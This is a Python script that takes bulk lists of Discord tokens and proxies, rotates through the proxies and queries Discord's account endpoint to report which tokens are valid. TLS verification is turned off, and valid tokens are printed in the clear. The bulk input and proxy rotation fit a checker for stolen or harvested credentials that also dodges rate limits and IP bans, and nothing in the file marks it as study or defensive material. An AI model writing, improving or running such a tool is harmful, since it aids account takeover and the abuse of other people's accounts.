import aiohttp
import asyncio

def format_proxy(proxy: str) -> str:
    """
    Formats the proxy string to ensure it's in the proper format for aiohttp.

    Args:
        proxy (str): Raw proxy string (could be http://IP:PORT or IP:PORT:USER:PASS).

    Returns:
        str: Formatted proxy URL (http://USER:PASS@IP:PORT or http://IP:PORT).
    """
    if proxy.startswith('http://'):
        return proxy  # Proxy is already formatted correctly

    parts = proxy.split(':')
    if len(parts) == 2:
        # Proxy format: IP:PORT
        return f'http://{parts[0]}:{parts[1]}'
    elif len(parts) == 4:
        # Proxy format: IP:PORT:USER:PASS
        return f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'
    else:
        raise ValueError(f'Invalid proxy format: {proxy}')

async def check_token(token: str, session: aiohttp.ClientSession, proxy: str) -> bool:
    """
    Checks the validity of a Discord token by querying the @me endpoint using a proxy.

    Args:
        token (str): Discord token to check.
        session (aiohttp.ClientSession): AIOHTTP session with a shared TLS connection pool.
        proxy (str): The proxy to route the request through.

    Returns:
        bool: True if the token is valid, False otherwise.
    """
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }
    try:
        formatted_proxy = format_proxy(proxy)
        async with session.get('https://discord.com/api/v9/users/@me', headers=headers, proxy=formatted_proxy) as response:
            if response.status == 200:
                print(f'Token {token} is valid using proxy {formatted_proxy}.')
                return True
            else:
                print(f'Token {token} is invalid using proxy {formatted_proxy}. Status code: {response.status}')
                return False
    except Exception as e:
        print(f'Error checking token {token} with proxy {formatted_proxy}: {e}')
        return False

async def check_tokens(tokens: list[str], proxies: list[str], connector: aiohttp.TCPConnector):
    """
    Iterates over tokens and proxies, checking the validity of each token using a shared TLS connection pool.

    Args:
        tokens (list[str]): List of Discord tokens to check.
        proxies (list[str]): List of proxies to use.
        connector (aiohttp.TCPConnector): Shared TCP connector for TLS connections.
    """
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for i, token in enumerate(tokens):
            proxy = proxies[i % len(proxies)]  # Use proxies in a round-robin fashion
            tasks.append(check_token(token, session, proxy))
        await asyncio.gather(*tasks)

async def check(tokens: list[str], proxies: list[str]):
   

    # Create a shared TCP connector (TLS pool)
    connector = aiohttp.TCPConnector(ssl=False)

    await check_tokens(tokens, proxies, connector)
    
    
async def main():
    with open('tokens.txt', 'r') as file:
        tokens = file.read().splitlines()
        
    with open('proxies.txt', 'r') as file:
        proxies = file.read().splitlines()

    await check(tokens, proxies)

if __name__ == '__main__':
    # Run the main function
    asyncio.run(main())
